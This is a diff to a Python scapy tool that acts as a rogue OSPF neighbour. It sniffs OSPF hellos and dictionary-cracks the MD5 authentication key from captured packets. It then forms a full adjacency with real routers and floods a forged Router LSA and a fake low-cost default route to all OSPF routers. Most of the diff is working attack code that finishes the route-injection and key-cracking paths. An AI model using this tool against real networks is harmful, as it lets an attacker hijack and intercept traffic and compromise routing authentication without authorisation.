@@ -1,12 +1,13 @@
 #!/usr/bin/python3
 
+import secrets
 import hashlib
 import logging
 import threading
 import time
 import typing
 from dataclasses import dataclass, field
-from enum import Enum, IntEnum, auto
+from enum import Enum, IntEnum, auto, IntFlag
 from typing import Any
 
 from scapy.all import Packet, sendp, sniff
@@ -15,19 +16,20 @@ from scapy.contrib.ospf import (
     OSPF_External_LSA,
     OSPF_Hdr,
     OSPF_Hello,
-    OSPF_LSUpd,
+    OSPF_LSUpd, OSPF_LSA_Hdr, OSPF_LSAck, OSPF_Router_LSA, OSPF_Link,
 )
 from scapy.layers.inet import IP
 from scapy.layers.l2 import Ether
 
+logging.basicConfig(level=logging.DEBUG)
 LOG = logging.getLogger("ospf-session")
 
 ALL_SPF_ROUTERS = "224.0.0.5"
 ALL_SPF_ROUTERS_MAC = "01:00:5e:00:00:05"
-ALL_DR_ROUTERS = "224.0.0.6"
-ALL_DR_ROUTERS_MAC = "01:00:5e:00:00:06"
 
-ROCKYOU = "/usr/share/wordlist/rockyou.txt"
+# NOTE: NOT USED
+# ALL_DR_ROUTERS = "224.0.0.6"
+# ALL_DR_ROUTERS_MAC = "01:00:5e:00:00:06"
 
 class OSPFAuthType(IntEnum):
     NONE = 0
@@ -57,7 +59,7 @@ class OSPFType(IntEnum):
     LSACK = 5
 
 
-class DBDFlags(IntEnum):
+class DBDFlags(IntFlag):
     NONE = 0x00
     INIT = 0x04
     MORE = 0x02 
@@ -69,23 +71,25 @@ class OSPFConfig:
     iface: str
     router_id: str
     mask: str
+    int_ip: str
     area: str = "0.0.0.0"
-    int_ip: str | None = None
+
+    lsa_seq: int = 0x80000001
     
     # Auth details 
     authtype: int | None = None
     plaintext_pw: str | None = None
     key_id: int | None = None
     authdata_len: int | None = None
-    seq: int | None = None
+    authseq: int | None = None
 
     hello_interval: int = 10
     dead_interval: int = 40
     priority: int = 0 #NOTE: Priority 0 = DROTHER - not participating in DR/BDR election
     options: int = 0x02
     mtu: int = 1500
-    rxmt_interval: int = 5 # retransmission interval
-    max_retries: int = 3
+    # rxmt_interval: int = 5 # retransmission interval
+    # max_retries: int = 3
 
 
 @dataclass
@@ -229,34 +233,6 @@ self.config.area,
         )
     ### ------ OSPF HELLO ENDS ------ ###
 
-    ### ----- Retransmission Loop ------ ###
-    # def start_retransmission_loop(self) -> threading.Thread:
-    #     thread = threading.Thread(target=self._retransmission_loop, daemon=True)
-    #     thread.start()
-    #     return thread
-    #
-    # def _retransmission_loop(self) -> None:
-    #     while self.running:
-    #         now = time.time()
-    #
-    #         with self.lock:
-    #             for nb in self.neighbours.values():
-    #                 for key, entry in list(nb.pending_acks.items()):
-    #                     # Skip if retransmission interval not reached
-    #                     if now - entry["sent_at"] < self.config.rxmt_interval:
-    #                         continue
-    #
-    #                     if entry["retries"] >= self.config.max_retries:
-    #                         LOG.warning("Max retransmission retires reached for %s, stopping retransmission...", nb.router_id)
-    #                         del nb.pending_acks[key]
-    #                         continue
-    #
-    #                     LOG.debug("Retransmitting %s to %s...", key, nb.router_id)
-    #                     self.send_lsupd(nb, [entry["lsa"]], track_ack=False)
-    #                     entry["sent_at"] = now
-    #                     entry["retries"] += 1
-    #         time.sleep(1)
-
     ### ------ OSPF SNIFFER ------ ###
     def start_sniffer(self) -> None:
         sniff(
@@ -298,14 +274,13 @@ self.config.area,
             self.config.authdata_len = getattr(ospf, "authdatalen", 0)
 
             if not hasattr(ospf, "seq"):
-                self.config.seq = int(time.time()) & 0xFFFFFFFF
+                self.config.authseq = int(time.time()) & 0xFFFFFFFF
             else:
-                self.config.seq = (getattr(ospf, "seq", 0) + 1) & 0xFFFFFFFF
+                self.config.authseq = (getattr(ospf, "seq", 0) + 1) & 0xFFFFFFFF
 
             # Crypto Authdata PW is the last 16 bytes of the packet
             # Convert raw packet to bytes and retrieve last 16 bytes to extract hashed pw
-            # TODO: Run hash cracker func
-            self.config.plaintext_pw = self.crack_password(ospf, ROCKYOU)
+            self.config.plaintext_pw = self.crack_password(ospf, self.dictpath)
 
             if not self.config.plaintext_pw:
                 return
@@ -319,12 +294,8 @@ self.config.area,
             self.handle_hello(nb, ospf)
         elif ospf.type == OSPFType.DBD:
             self.handle_dbd(nb, ospf)
-        # elif ospf.type == OSPFType.LSR:
-        #     self.handle_lsreq(nb, ospf)
-        # elif ospf.type == OSPFType.LSU:
-        #     self.handle_lsupd(nb, ospf)
-        # elif ospf.type == OSPFType.LSACK:
-        #     self.handle_lsack(nb, ospf)
+        elif ospf.type == OSPFType.LSU:
+            self.handle_lsupd(nb, ospf)
 
     def get_or_create_neighbour(self, pkt: Any) -> Neighbour:
         """Get Neighbour List and Adds Neighbour to List if not already added"""
@@ -332,7 +303,6 @@ self.config.area,
         router_id = str(ospf.src)
         ip = pkt[IP].src
 
-        # TODO: check correct type usage
         nb = self.neighbours.get(router_id)
 
         if nb is None:
@@ -369,7 +339,7 @@ self.config.area,
             if nb.state in {NeighbourState.DOWN, NeighbourState.INIT}:
                 nb.set_state(NeighbourState.TWO_WAY)
 
-        # Form adjacency if 
+        # Form adjacency
         if nb.state == NeighbourState.TWO_WAY and self.should_form_adjacency(nb, ospf_hello):
             self.start_exstart(nb)
 
@@ -392,8 +362,8 @@ self.config.area,
 
         nb.set_state(NeighbourState.EXSTART)
         nb.is_master = None
-        # Match 32-bit OSPF Seq numbers
-        nb.dd_seq = int(time.time()) & 0xFFFFFFFF
+        # Use secrets to generate seq number - smaller than using time.time
+        nb.dd_seq = secrets.randbelow(0xFFFFFFFF - 1) + 1
 
         dbd_packet = self.build_dbd_packet(
                 master=True,
@@ -438,10 +408,19 @@ self.config.area,
                 )
     
     def handle_dbd(self, nb: Neighbour, ospf: Any) -> None:
-        """Handler for received OSPF DBD Type Packet"""
+        """Handler for RECEIVED OSPF DBD Type Packet"""
         dbd_packet = ospf[OSPF_DBDesc]
         # Retrieve integer bitmask and cast to DBDFlags Enum
         flags = DBDFlags(dbd_packet.dbdescr)
+
+        LOG.info(
+                "DBD from %s: flags=%s, raw=%s, ddseq=%s, lsaheaders=%d",
+                nb.ip,
+                flags,
+                int(dbd_packet.dbdescr),
+                dbd_packet.ddseq,
+                len(getattr(dbd_packet, "lsaheaders", [])),
+                )
 
         # Ensure neighbour state not DOWN, INIT or TWO_WAY
         if nb.state in {NeighbourState.DOWN, NeighbourState.INIT, NeighbourState.TWO_WAY}:
@@ -456,10 +435,6 @@ self.config.area,
         if nb.state == NeighbourState.EXCHANGE:
             self.handle_exchange_dbd(nb, dbd_packet, flags)
 
-        # Get full details of missing/outdated routes
-        # if nb.state == NeighbourState.LOADING:
-        #     self.handle_loading_dbd(nb, dbd_packet, flags)
-
     def handle_exstart_dbd(self, nb: Neighbour, dbd_packet: OSPF_DBDesc, flags: DBDFlags) -> None:
         """Handler to establish master/slave relationship"""
         # Safe evaluation for empty lsaheaders returns True if empty, False otherwise
@@ -471,7 +446,8 @@ self.config.area,
 
         if nb_proposes_master and nb.is_master is None:
             # Neighbour has larger router id - wins master role
-            if nb.router_id > self.config.router_id:
+            if self.router_id_gt(nb.router_id, self.config.router_id):
+                LOG.debug("We are slave")
                 nb.is_master = True 
                 nb.dd_seq = dbd_packet.ddseq
 
@@ -479,7 +455,7 @@ self.config.area,
                 reply_packet = self.build_dbd_packet(
                         master=False,
                         init=False,
-                        more=True,
+                        more=False,
                         dd_seq=typing.cast(int, nb.dd_seq),
                         lsa_headers=[],
                         )
@@ -500,6 +476,7 @@ self.config.area,
 
         if nb_yeilded:
             nb.is_master = False 
+            LOG.debug("We are master")
 
             # Safely parse headers
             lsa_headers = getattr(dbd_packet, "lsaheaders", []) or []
@@ -507,19 +484,24 @@ self.config.area,
             nb.set_state(NeighbourState.EXCHANGE)
 
             self.continue_dbd_exchange(nb, more=bool(flags & DBDFlags.MORE))
+
+    def router_id_gt(self, a: str, b: str) -> bool:
+        """Helper to get compare router-ids - Can't compare strings directly"""
+        import ipaddress
+        return int(ipaddress.IPv4Address(a)) > int(ipaddress.IPv4Address(b))
     
     def handle_exchange_dbd(self, nb: Neighbour, dbd_packet: OSPF_DBDesc, flags: DBDFlags) -> None:
         """Handler for OSPF DBD EXCHANGE STATE packet exchange"""
         self.collect_lsa_headers(nb, dbd_packet.lsaheaders)
 
         if nb.is_master is True:
-            # Update neighbour tracker to received seq num
+            # Update neighbour tracker to the received seq num
             nb.dd_seq = dbd_packet.ddseq
 
             reply = self.build_dbd_packet(
                     master=False,
                     init=False,
-                    more=bool(flags & DBDFlags.MORE),
+                    more=False, # Hardcode False since we not sending LSAheaders
                     dd_seq=typing.cast(int, nb.dd_seq),
                     lsa_headers=[],
                     )
@@ -542,23 +524,29 @@ self.config.area,
 
             self.continue_dbd_exchange(nb, more=bool(flags & DBDFlags.MORE))
 
-    # NOTE: SHOULD NOT BE NEEDED as we dont plan on being master but here for good measure
     def continue_dbd_exchange(self, nb: Neighbour, more: bool) -> None:
         """Master only func: Increments dd sequence"""
-        if more:
-            # Increment on 32-bit seq number
-            nb.dd_seq = (typing.cast(int, nb.dd_seq) + 1) & 0xFFFFFFFF
+        if nb.dd_seq is None:
+            LOG.warning("Cannot continue DBD exchange with %s: missing DD sequence.", nb.router_id)
+            return
 
-            dbd_packet = self.build_dbd_packet(
-                    master=True,
-                    init=False,
-                    more=False,
-                    dd_seq=nb.dd_seq,
-                    lsa_headers=[],
-                    )
-            self._send_ospf(nb.ip, typing.cast(str, nb.mac), OSPFType.DBD, dbd_packet)
-        else:
+        if not more:
+            LOG.debug("Send final master DBD to %s", nb.router_id)
             self.exchange_complete(nb)
+            return
+
+        # Increment on 32-bit seq number
+        nb.dd_seq = (nb.dd_seq + 1) & 0xFFFFFFFF
+
+        dbd_packet = self.build_dbd_packet(
+                master=True,
+                init=False,
+                more=False,
+                dd_seq=nb.dd_seq,
+                lsa_headers=[],
+                )
+
+        self._send_ospf(nb.ip, typing.cast(str, nb.mac), OSPFType.DBD, dbd_packet)
 
     def collect_lsa_headers(self, nb: Neighbour, lsaheaders: list[Any]) -> None:
         """Collects DBD LSA Headers and append to Unknown LSA's to Neighbour's `neighbour_headers` list"""
@@ -579,7 +567,7 @@ self.config.area,
 
     ### ------ REQUEST MISSING LSAs ------ ###
     def exchange_complete(self, nb: Neighbour) -> None:
-        """Requests missing LSAs, after DBD exchange is done"""
+        """Inject Route After DBD EXCHANGE Complete"""
         if nb.neighbour_headers:
             # nb.set_state(NeighbourState.LOADING)
             # nb.neighbour_headers.clear()
@@ -589,10 +577,27 @@ self.config.area,
         nb.set_state(NeighbourState.FULL)
         LOG.info("Neighbour %s state set to FULL. Beginning route injection...", nb.router_id)
 
-        self.inject_low_cost_route()
+        self.inject_low_cost_route(nb)
 
-    def inject_low_cost_route(self) -> None:
+    def inject_low_cost_route(self, nb: Neighbour) -> None:
         """Construct and floods fake default route"""
+        # Craft Type 1 Router LSA
+        link = OSPF_Link(
+                id=nb.ip,
+                data=self.config.int_ip,
+                type=2, # 2 for Transit Link as seen in _OSPF_Router_LSA_types
+                metric=1 # OSPF Link with route cost 1
+                )
+
+        router_lsa = OSPF_Router_LSA(
+                id=self.config.router_id,
+                adrouter=self.config.router_id,
+                type=1,
+                seq=self.config.lsa_seq,
+                flags=0x02, # Flag 0x02 marks this device as ASBR
+                linklist=link,
+                )
+
         # Craft LSA to replicate `default-information originate always metric-type 1 metric 1` router command
         fake_route = OSPF_External_LSA(
                 type=5,
@@ -605,180 +610,62 @@ self.config.area,
 
         # Bundle LSA in LSU payload
         lsu_payload = OSPF_LSUpd(
-                lsacount=1,
-                lsalist=[fake_route],
+                lsacount=2,
+                lsalist=[router_lsa, fake_route],
                 )
 
-        # Since we are DROTHER, send payload to ALLDROUTERS multicast
+        # Sending to ALL_DR_ROUTERS didn't work but ALL_SPF_ROUTERS did
         # dr will intercept and validate against our FULL adjacency
         self._send_ospf(
-                dst_ip=ALL_DR_ROUTERS,
-                dst_mac=ALL_DR_ROUTERS_MAC,
+                dst_ip=ALL_SPF_ROUTERS,
+                dst_mac=ALL_SPF_ROUTERS_MAC,
                 ospf_type=OSPFType.LSU,
                 payload=lsu_payload,
                 )
 
-        LOG.info("Injected Type 1 default route via %s", ALL_DR_ROUTERS)
+        LOG.info("Injected Type 1 default route to %s via %s", nb.ip, ALL_SPF_ROUTERS)
 
-    # NOTE: NO NEED TO SUPPORT LSReq, LSRep, LSAck etc
-    # def send_next_lsreq_batch(self, nb:Neighbour) -> None:
-    #     # No LSA to send - Proceed to FULL state
-    #     if not nb.neighbour_headers:
-    #         nb.set_state(NeighbourState.FULL)
-    #         LOG.info("Reached FULL state with neighbour %s", nb.router_id)
-    #         return
-    #
-    #     lsreq_items = []
-    #
-    #     for hdr in nb.neighbour_headers:
-    #         lsreq = OSPF_LSReq_Item(
-    #                 type=hdr.type,
-    #                 id=hdr.id,
-    #                 adrouter=hdr.adrouter,
-    #                 )
-    #         
-    #         lsreq_items.append(lsreq)
-    #
-    #     nb.pending_requests = []
-    #
-    #     for hdr in nb.neighbour_headers:
-    #         key = (hdr.type, str(hdr.id), str(hdr.adrouter))
-    #         nb.pending_requests.append(key)
-    #
-    #     # Craft LSR payload
-    #     lsreq = OSPF_LSReq(requests=lsreq_items)
-    #
-    #     self._send_ospf(
-    #             dst_ip=nb.ip,
-    #             dst_mac=typing.cast(str, nb.mac),
-    #             ospf_type=OSPFType.LSR,
-    #             payload=lsreq
-    #             )
-    #
-    # def handle_lsupd(self, nb:Neighbour, ospf_packet: Any) -> None:
-    #     """Received full LSA and stores them"""
-    #     lsupd = ospf_packet[OSPF_LSUpd]
-    #     received_lsas = []
-    #
-    #     for lsa in lsupd.lsalist:
-    #         key = self.lsa_key(lsa)
-    #         current = self.lsdb.get(key)
-    #
-    #         if current is None or self.is_newer_lsa(lsa, current):
-    #             self.lsdb[key] = lsa
-    #             received_lsas.append(lsa)
-    #
-    #         # Repopulate neighbour_headers list without received key
-    #         nb.neighbour_headers = [
-    #                 hdr for hdr in nb.neighbour_headers
-    #                 if (hdr.type, str(hdr.id), str(hdr.adrouter)) != key
-    #                 ]
-    #
-    #         # Repopulate pending_requests list without received req
-    #         nb.pending_requests = [
-    #                 req for req in nb.pending_requests
-    #                 if req != key
-    #                 ]
-    #     if received_lsas:
-    #         self.send_lsa_ack(nb, received_lsas)
-    #
-    #     if nb.state == NeighbourState.LOADING and not nb.pending_requests:
-    #         self.send_next_lsreq_batch(nb)
-    #
-    # def is_newer_lsa(self, incoming: Any, current: Any) -> bool:
-    #     """Helper function to determine if incoming LSDB is newer that current"""
-    #     if incoming.seq != current.seq:
-    #         return incoming.seq > current.seq
-    #
-    #     if incoming.chksum != current.chksum:
-    #         return incoming.chksum > current.chksum
-    #
-    #     return incoming.age < current.age
-    #
-    # def send_lsa_ack(self, nb: Neighbour, lsas: list[Any]) -> None:
-    #     """Send LSA Ack"""
-    #     headers = [
-    #             OSPF_LSA_Hdr(
-    #                 age=lsa.age,
-    #                 options=lsa.options,
-    #                 type=lsa.type,
-    #                 id=lsa.id,
-    #                 adrouter=lsa.adrouter,
-    #                 seq=lsa.seq,
-    #                 chksum=lsa.chksum,
-    #                 len=lsa.len,
-    #                 )
-    #             for lsa in lsas
-    #             ]
-    #
-    #     ack = OSPF_LSAck(lsaheaders=headers)
-    #
-    #     self._send_ospf(
-    #             dst_ip=nb.ip,
-    #             dst_mac=typing.cast(str, nb.mac),
-    #             ospf_type=OSPFType.LSACK,
-    #             payload=ack,
-    #             )
-    #
-    # def handle_lsreq(self, nb: Neighbour, ospf: Any) -> None:
-    #     """Handles neighbour's request for full LSAs"""
-    #     req = ospf[OSPF_LSReq]
-    #     lsas_to_send = []
-    #
-    #     for item in req.requests:
-    #         key = self.lsa_key(item)
-    #         lsa = self.lsdb.get(key)
-    #
-    #         if lsa is None:
-    #             LOG.warning("Neighbour %s requested unknown LSA %s, skipping...", nb.router_id, key)
-    #             continue
-    #
-    #         lsas_to_send.append(lsa)
-    #
-    #     if lsas_to_send:
-    #         self.send_lsupd(nb, lsas_to_send, track_ack=True)
-    #
-    # def handle_lsack(self, nb: Neighbour, ospf: Any) -> None:
-    #     """Handles Acknowledgement for LSAs sent - Remove entry from pending_ack list"""
-    #     ack = ospf[OSPF_LSAck]
-    #
-    #     for hdr in ack.lsaheaders:
-    #         key = self.lsa_key(hdr)
-    #
-    #         if key in nb.pending_acks:
-    #             del nb.pending_acks[key]
-    #             LOG.debug("Neighbour %s acknowledged LSA %s", nb.router_id, key)
-    #
-    # def handle_loading_dbd(self, nb: Neighbour, dbd_packet: OSPF_DBDesc, flags: DBDFlags) -> None:
-    #     """Handles incoming DBD packets while waiting for requested LSAs"""
-    #     self.collect_lsa_headers(nb, dbd_packet.lsaheaders)
-    #
-    #     if nb.neighbour_headers and not nb.pending_requests:
-    #         self.send_next_lsreq_batch(nb)
-    #
-    # def send_lsupd(self, nb: Neighbour, lsas: list[Any], track_ack: bool):
-    #     """Send full LSAs to neighbour"""
-    #     if nb.mac is None:
-    #         LOG.warning("Missing MAC, unable to send LSU to %s", nb.router_id)
-    #         return
-    #
-    #     lsu_payload = OSPF_LSUpd(lsalist=lsas)
-    #
-    #     self._send_ospf(
-    #             dst_ip=nb.ip,
-    #             dst_mac=nb.mac,
-    #             ospf_type=OSPFType.LSU,
-    #             payload=lsu_payload,
-    #             )
-    #
-    #     if track_ack:
-    #         for lsa in lsas:
-    #             key = self.lsa_key(lsa)
-    #             nb.pending_acks[key] = {
-    #                     "lsa": lsa,
-    #                     "sent_at": time.time(),
-    #                     "retries": 0,
-    #                     }
+    def handle_lsupd(self, nb: Neighbour, ospf: Any) -> None:
+        """Handler for received LSUpd packets - Prevents Neighbour from shutting down link due to too many LSUpds with no response"""
+        lsu = ospf[OSPF_LSUpd]
+        lsas = getattr(lsu, "lsalist", [])
+
+        if lsas:
+            # Digging through LSA list to extract my LSA sequence number
+            for lsa in lsas:
+                if isinstance(lsa, OSPF_Router_LSA) and lsa.adrouter == self.config.router_id:
+                    # Track new seq number to use if used (for injecting route)
+                    self.config.lsa_seq = lsa.seq + 1
+
+        LOG.info("Received LSU from %s with %d LSAs", nb.router_id, len(lsas))
+
+        # Send LSAck - Skip storing LSAs
+        self.send_lsa_ack(nb, lsas)
+
+    def send_lsa_ack(self, nb: Neighbour, lsas: list[Any]) -> None:
+        """Sends and Builds LSAck packets"""
+        headers = [
+                OSPF_LSA_Hdr(
+                    age=lsa.age,
+                    options=lsa.options,
+                    type=lsa.type,
+                    id=lsa.id,
+                    adrouter=lsa.adrouter,
+                    seq=lsa.seq,
+                    chksum=lsa.chksum,
+                    len=lsa.len,
+                    )
+                for lsa in lsas
+                ]
+
+        ack = OSPF_LSAck(lsaheaders=headers)
+
+        self._send_ospf(
+                dst_ip=nb.ip,
+                dst_mac=typing.cast(str, nb.mac),
+                ospf_type=OSPFType.LSACK,
+                payload=ack,
+                )
 
     def crack_password(self, ospf_pkt: OSPF_Hdr, filename: str) -> str | None:
         """
@@ -786,15 +673,23 @@ self.config.area,
 
         Currently only supports MD5 Hash Cracking
 
-        OSPF Uses Net-MD5, a specific MD5 hashing format
+        OSPF Uses a specific MD5 hashing format
 
         How it works:
-            1.  Enforces a strict 16 byte long Key by padding NULL bytes to the end of the key if the key length is less than 16 bytes
+            1.  Clears chksum bit in OSPF Header - set to 0
+            2.  Enforces a strict 16 byte long Key by padding NULL bytes to the end of the key if the key length is less than 16 bytes
                 Otherwise, uses the first 16 bytes of the password as the Key
-            2.  Concatenates 
+            3.  Concatenates the actual OSPF Packet (Header + Payload) with formatted Key
+            4.  Calculates MD5 hash from this buffer and appends it to the end of the entire packet
 
+        How we crack the hash:
+            1.  Extract the hash from the packet - last 16 bytes
+            2.  Extract OSPF Packet (Header + Payload) from the packet (Start of OSPF Header to End of packet - 16 bytes)
+            3.  Run a dictionary attack hashing each password by following the hashing method above
+            4.  Compare each hash digest against the extracted hash to get the password
         """
-        # Theoretically chksum should alr be 0 but just in case
+
+        # Theoretically chksum should alr be 0 but jic
         if getattr(ospf_pkt, "chksum", None) != 0:
             setattr(ospf_pkt, "chksum", 0)
 
@@ -850,7 +745,7 @@ self.config.area,
                     authtype=self.config.authtype,
                     keyid=self.config.key_id,
                     authdatalen=self.config.authdata_len,
-                    seq=self.config.seq,
+                    seq=self.config.authseq,
                     key=self.config.plaintext_pw
                     )
         elif self.config.authtype == OSPFAuthType.PLAINTEXT:
@@ -879,11 +774,3 @@ self.config.area,
             )
 
         sendp(pkt, iface=self.config.iface, verbose=False)
-
-    # def lsa_key(self, lsa_or_hdr: Any) -> tuple[int, str, str]:
-    #     """Small Reusable lsa key helper"""
-    #     return (
-    #             int(lsa_or_hdr.type),
-    #             str(lsa_or_hdr.id),
-    #             str(lsa_or_hdr.adrouter),
-    #             )
